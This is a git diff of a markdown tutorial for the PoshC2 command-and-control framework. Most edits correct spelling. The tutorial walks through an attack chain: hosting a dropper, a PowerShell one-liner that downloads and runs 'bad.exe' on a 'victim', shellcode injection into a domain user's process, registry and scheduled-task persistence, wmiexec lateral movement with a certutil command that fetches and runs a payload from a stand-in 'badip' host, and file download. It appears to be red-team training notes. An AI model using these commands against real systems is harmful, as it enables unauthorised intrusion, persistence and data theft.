@@ -2,11 +2,11 @@
 
 - Running Poshc2 
 	- Set up
-	- tool familierization 
+	- tool familiarization 
 		- hosting payload
 		- file upload 
 		- host enumeration 
-		- user escelation
+		- user escalation
 		- persistence / scripting
 		- later movement
         - file download
@@ -15,7 +15,7 @@
 	- file (payload) execution 
 - powershell 
 	- user enumeration 
-	- domain enumeratoin 
+	- domain enumeration 
 	- scripting
 
 
@@ -65,9 +65,9 @@ In the ImplantHandler run file upload command
 add-hosted-file
 ```
 
-Host file opttions 
+Host file options 
 ```
-file location > /var/poschc2/yourprojectname/payloads/Sharp_v4_dropper_x64.exe
+file location > /var/poshc2/YourProjectName/payloads/Sharp_v4_dropper_x64.exe
 file uri > /en-us/readme.md
 file MIME type > text/html
 Base64 > n
@@ -80,14 +80,14 @@ show-hosted-files
 
 # Download Payload on Victim 
 
-For testing lets downloading using powershell on victim machine usign a basic user
+For testing lets downloading using powershell on victim machine using a basic user
 ```powershell
-iwr -uri http://<youripordomian>/hosteduritring -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
+iwr -uri http://<YouripOrDomian>/HostedUriString -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
 ```
 
 Interact with implant by typeing `1` in ImplantHandler
 
-# User Escilation
+# User Escalation
 
 Check for running process 
 ```ps 
@@ -95,7 +95,7 @@ ps
 ```
 > As a basic user you'll only be able to see anything ran under your own context. 
 
-Lets escalte to system through execution  
+Lets escalate to system through execution  
 
 Upload a the dll to the machine 
 ```ps
@@ -120,19 +120,22 @@ ps
 Search for any user process being ran as a domain user, to inject into
 
 ```ps
-inject-shellcode <PID> <name_of_shellcode.bin>
+inject-shellcode <PID> 
+```
+```ps
+<name_of_shellcode.bin>
 ```
 
 Checking your ImplantHandler you should see a new beacon running in the context of said user.
 
-As a domain user you can now run domain level commands, you can check your groups and privliages 
+As a domain user you can now run domain level commands, you can check your groups and privileges 
 ``` 
 sharpps net user <domain username>
 ```
 
 # Persistence and Scripting 
 
-Now to maintain our doamin user privlige lets create a .ps1 script to set persistence using registry keys  
+Now to maintain our domain user privilege lets create a .ps1 script to set persistence using registry keys  
 
 On your attack box with the editor of your choice copy the following 
 ```ps
@@ -153,7 +156,7 @@ Lets run the .ps1
 pslo /home/parrot/desktop/bad.ps1
 ```
 
-You should see your scheudled task name appear for confirmation 
+You should see your scheduled task name appear for confirmation 
 
 # Lateral Movement 
 
@@ -184,7 +187,7 @@ Base64 > n
 
 Run wimc to get download and execution of hosted payload
 ```
-wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.e xe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
+wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
 ```
 
 In ImplantHandler interact with the new payload 
@@ -204,6 +207,12 @@ Now lets download some files
 download-file <filename>
 ```
 
-Congragulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.
+Congratulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.
+
+Things to lookup and learn: 
+- [ ] MIME types
+- [ ] Windows 10 privilege escalation 
+- [ ]   
+
 
 
